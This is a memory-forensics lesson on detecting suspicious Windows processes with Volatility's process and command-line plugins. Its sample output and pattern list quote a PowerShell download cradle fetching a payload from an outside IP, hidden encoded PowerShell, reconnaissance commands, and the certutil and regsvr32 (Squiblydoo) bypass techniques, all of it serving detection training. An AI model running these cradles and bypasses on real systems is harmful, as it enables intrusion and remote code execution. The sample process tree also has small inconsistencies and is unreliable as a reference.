Learning Objectives

  • Differentiate between pslist, psscan, and pstree and when to use each
  • Identify suspicious parent-child process relationships
  • Detect hidden and unlinked processes using cross-view analysis
  • Recognize normal Windows process hierarchy vs malicious anomalies
  • Correlate process creation times with incident timelines

Three Views of Processes

Volatility provides three distinct plugins for process enumeration. Each uses a different method to find processes, and discrepancies between them are strong indicators of rootkit activity or process manipulation.

Plugin Method Strengths Limitations
windows.pslist Walks the EPROCESS doubly-linked list (ActiveProcessLinks) Fast, shows handles/threads. Same view as Task Manager. Cannot find processes unlinked by rootkits (DKOM attacks)
windows.psscan Pool tag scanning across all physical memory Finds terminated, hidden, and unlinked processes Slower, may produce false positives from residual memory
windows.pstree Builds parent-child tree from pslist data Reveals process hierarchy and orphaned processes Same limitations as pslist (linked-list based)

Normal Windows Process Hierarchy

Before you can spot anomalies, you must know what normal looks like. Every Windows system has a predictable process tree. Deviations from this pattern are red flags.

Expected Windows Process Tree
System (PID 4)
  |- smss.exe           # Session Manager - only one, parent is System
     |- csrss.exe       # Client/Server Runtime - one per session
     |- wininit.exe     # Session 0 initialization
        |- services.exe  # Service Control Manager
        |  |- svchost.exe # Service host (multiple instances, all from services.exe)
        |  |- spoolsv.exe # Print Spooler
        |  |- lsass.exe   # Local Security Authority (exactly ONE instance)
        |- lsass.exe     # LSASS - handles authentication
     |- winlogon.exe    # Session 1 logon
        |- explorer.exe  # User shell
           |- chrome.exe  # User applications
           |- notepad.exe

Red Flags in Process Trees

  • svchost.exe with a parent other than services.exe
  • Multiple lsass.exe instances (there should be exactly one)
  • csrss.exe or smss.exe spawned by anything other than the expected parent
  • cmd.exe or powershell.exe spawned by svchost.exe or iexplore.exe
  • Processes with misspelled names: svch0st.exe, lssas.exe, csrs.exe
  • explorer.exe spawning processes that connect to external IPs

Running Process Analysis

pslist - Linked List Enumeration
$ python3 vol.py -f memory.raw windows.pslist

PID   PPID  ImageFileName      CreateTime                   Threads  Handles
4     0     System             2026-03-12 08:01:02.000000   104      --
88    4     Registry           2026-03-12 08:01:00.000000   4        --
348   4     smss.exe           2026-03-12 08:01:02.000000   2        --
444   436   csrss.exe          2026-03-12 08:01:05.000000   10       --
512   436   wininit.exe        2026-03-12 08:01:06.000000   1        --
588   512   services.exe       2026-03-12 08:01:07.000000   6        --
608   512   lsass.exe          2026-03-12 08:01:07.000000   8        --
784   588   svchost.exe        2026-03-12 08:01:08.000000   12       --
856   588   svchost.exe        2026-03-12 08:01:09.000000   8        --
3284  784   cmd.exe            2026-03-12 14:15:33.000000   1        --
3312  3284  powershell.exe     2026-03-12 14:15:35.000000   5        --

Notice PIDs 3284 and 3312: cmd.exe spawned by svchost.exe (PID 784), then launching PowerShell. This is a classic indicator of exploitation -- a service being used to spawn a command shell.

psscan - Finding Hidden Processes
$ python3 vol.py -f memory.raw windows.psscan

# Compare output with pslist. Processes appearing in psscan
# but NOT in pslist may be hidden by rootkits (DKOM).

PID   PPID  ImageFileName      Offset(V)          CreateTime
4     0     System             0xfa8000c62040      2026-03-12 08:01:02
...
2716  588   backdoor.exe       0xfa8003f1a080      2026-03-12 14:12:01
...

# PID 2716 (backdoor.exe) appears in psscan but NOT in pslist
# This process has been hidden using Direct Kernel Object Manipulation

Command Line Analysis

The command line used to launch a process often reveals malicious intent. Encoded PowerShell commands, suspicious paths, and unusual arguments are key indicators.

Extracting Process Command Lines
$ python3 vol.py -f memory.raw windows.cmdline

PID   Process          Args
784   svchost.exe      C:\Windows\system32\svchost.exe -k netsvcs
856   svchost.exe      C:\Windows\system32\svchost.exe -k LocalService
3284  cmd.exe          cmd.exe /c "whoami && net user && net localgroup administrators"
3312  powershell.exe   powershell.exe -nop -w hidden -enc SQBFAFgAIAAoA...

# The -enc flag indicates Base64-encoded commands
# Decode it:
$ echo "SQBFAFgAIAAoA..." | base64 -d
IEX (New-Object Net.WebClient).DownloadString('http://185.234.x.x/payload.ps1')

Common Malicious Command Patterns

  • powershell -enc -- Base64-encoded commands, almost always malicious
  • cmd /c with network reconnaissance (whoami, net user, ipconfig)
  • certutil -urlcache -split -f -- Using certutil as a download cradle
  • regsvr32 /s /n /u /i:http:// -- Squiblydoo AppLocker bypass

Practice: Spot the Anomaly

Given this process tree excerpt, identify all suspicious items and explain why:

  1. svchost.exe (PID 1024, PPID 588) -- Parent is services.exe
  2. svchost.exe (PID 4892, PPID 3100) -- Parent is explorer.exe
  3. lsass.exe (PID 608, PPID 512) -- Parent is wininit.exe
  4. lsass.exe (PID 5200, PPID 3100) -- Parent is explorer.exe
  5. csrss.exe (PID 444, PPID 436) -- Parent is smss.exe
  6. svch0st.exe (PID 6100, PPID 588) -- Parent is services.exe

Suspicious: #2 (svchost from explorer = wrong parent), #4 (second lsass + wrong parent), #6 (misspelled name with zero instead of 'o')

Key Takeaways

  • Always run both pslist and psscan -- differences reveal hidden processes (DKOM rootkits)
  • pstree visualizes parent-child relationships essential for spotting anomalies
  • Know the normal Windows process tree so deviations are immediately obvious
  • svchost.exe must always have services.exe as parent; lsass.exe should have exactly one instance
  • cmdline extraction reveals encoded commands, download cradles, and reconnaissance activity
  • Process creation timestamps help correlate activity with incident timelines
